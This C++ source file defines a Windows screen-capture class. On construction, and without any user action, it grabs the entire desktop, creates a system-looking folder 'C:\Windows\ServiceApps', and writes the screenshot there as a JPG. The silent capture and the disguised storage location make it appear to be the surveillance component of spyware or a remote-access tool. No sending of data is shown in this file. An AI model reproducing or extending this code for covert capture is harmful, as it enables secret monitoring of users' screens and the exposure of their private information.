#include "Screen.h"

Screen::Screen() {
			
	GdiplusStartup(&_gdiplusToken, &_gdiplusStartupInput, NULL);
	CreateDirectory(L"C:\\Windows\\ServiceApps", NULL);
	SetCurrentDirectoryA("C:\\Windows\\ServiceApps");
	_hwnd = GetDesktopWindow();
	_hBmp = ScreenCapture(_hwnd);
	_dataFormat = "jpg";
	
	if (Save(&_hBmp, _data, _dataFormat)) {
		std::ofstream fout("screen." + _dataFormat, std::ios::binary);
		fout.write((char*)_data.data(), _data.size());
	}
}

Screen::~Screen() {
	GdiplusShutdown(_gdiplusToken);
}

BITMAPINFOHEADER Screen::createBitmapHeader(int width, int height) {
	
	_bi.biSize		= sizeof(BITMAPINFOHEADER);
	_bi.biWidth		= width;
	_bi.biHeight		= -height;
	_bi.biPlanes		= 1;
	_bi.biBitCount		= 32;
	_bi.biCompression	= BI_RGB;
	_bi.biSizeImage		= 0;
	_bi.biXPelsPerMeter 	= 0;
	_bi.biYPelsPerMeter 	= 0;
	_bi.biClrUsed		= 0;
	_bi.biClrImportant	= 0;

	return _bi;
}

HBITMAP Screen::ScreenCapture(HWND hwnd) {

	_hWindowDC = GetDC(hwnd);
	_hWindowCompatibleDC = CreateCompatibleDC(_hWindowDC);
	SetStretchBltMode(_hWindowCompatibleDC, COLORONCOLOR);
	
	_screenX	= GetSystemMetrics(SM_XVIRTUALSCREEN);
	_screenY	= GetSystemMetrics(SM_YVIRTUALSCREEN);
	_width		= GetSystemMetrics(SM_CXVIRTUALSCREEN);
	_height		= GetSystemMetrics(SM_CYVIRTUALSCREEN);
		
	_hbwindow	= CreateCompatibleBitmap(_hWindowDC, _width, _height);
	_gdi_bi		= createBitmapHeader(_width, _height);
	
	SelectObject(_hWindowCompatibleDC, _hbwindow);
	_dwBmpSize = ((_width * _gdi_bi.biBitCount + 31) / 32) * 4 * _height;
	_hDIB = GlobalAlloc(GHND, _dwBmpSize);
	
	_lpbitmap = (char*)GlobalLock(_hDIB);
	StretchBlt(_hWindowCompatibleDC, 0, 0, _width, _height, _hWindowDC, _screenX, _screenY, _width, _height, SRCCOPY);
	GetDIBits(_hWindowCompatibleDC, _hbwindow, 0, _height, _lpbitmap, (BITMAPINFO*)&_gdi_bi, DIB_RGB_COLORS);
		
	DeleteDC(_hWindowCompatibleDC);
	ReleaseDC(hwnd, _hWindowDC);
		
	return _hbwindow;
}

bool Screen::Save(HBITMAP* hbitmap, vector<BYTE>& data, string format) {

	Bitmap bmp(*hbitmap, nullptr);
	_istream = nullptr;
	CreateStreamOnHGlobal(NULL, TRUE, &_istream);
		
	if (format.compare("bmp") == 0) { CLSIDFromString(L"{557cf400-1a04-11d3-9a73-0000f81ef32e}", &_clsid); }
	if (format.compare("jpg") == 0) { CLSIDFromString(L"{557cf401-1a04-11d3-9a73-0000f81ef32e}", &_clsid); }
	if (format.compare("gif") == 0) { CLSIDFromString(L"{557cf402-1a04-11d3-9a73-0000f81ef32e}", &_clsid); }
	if (format.compare("tif") == 0) { CLSIDFromString(L"{557cf405-1a04-11d3-9a73-0000f81ef32e}", &_clsid); }
	if (format.compare("png") == 0) { CLSIDFromString(L"{557cf406-1a04-11d3-9a73-0000f81ef32e}", &_clsid); }
	
	_status = bmp.Save(_istream, &_clsid, NULL);
	if (_status != Status::Ok) { return false; }			    
	_hg = NULL;

	GetHGlobalFromStream(_istream, &_hg);
	_bufsize = GlobalSize(_hg);
	data.resize(_bufsize);
	
	_pImage = GlobalLock(_hg);
	memcpy(&data[0], _pImage, _bufsize);
	GlobalUnlock(_hg);
	_istream->Release();

	return true;
}